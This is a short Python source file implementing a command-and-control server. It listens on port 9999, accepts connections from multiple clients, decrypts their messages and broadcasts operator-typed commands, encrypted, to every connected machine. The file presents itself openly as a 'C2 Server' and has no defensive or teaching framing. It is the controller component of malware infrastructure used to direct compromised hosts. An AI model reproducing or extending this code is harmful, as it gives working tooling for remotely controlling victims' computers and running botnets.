import socket, threading
from crypto_utils import encrypt_message, decrypt_message

HOST = '0.0.0.0'
PORT = 9999
clients = []

def handle_client(client, addr):
    print(f"📡 Client connected: {addr}")
    while True:
        try:
            msg = decrypt_message(client.recv(1024)).decode()
            if not msg:
                break
            print(f"[{addr}] 🛰️ {msg}")
        except:
            break
    client.close()

def start_server():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((HOST, PORT))
    server.listen(5)
    print(f"🧠 C2 Server listening on {HOST}:{PORT}")
    while True:
        client, addr = server.accept()
        clients.append(client)
        threading.Thread(target=handle_client, args=(client, addr)).start()

def command_loop():
    while True:
        cmd = input("C2> ")
        if cmd == "exit":
            break
        for client in clients:
            try:
                client.sendall(encrypt_message(cmd))
            except:
                pass

if __name__ == "__main__":
    threading.Thread(target=start_server, daemon=True).start()
    command_loop()
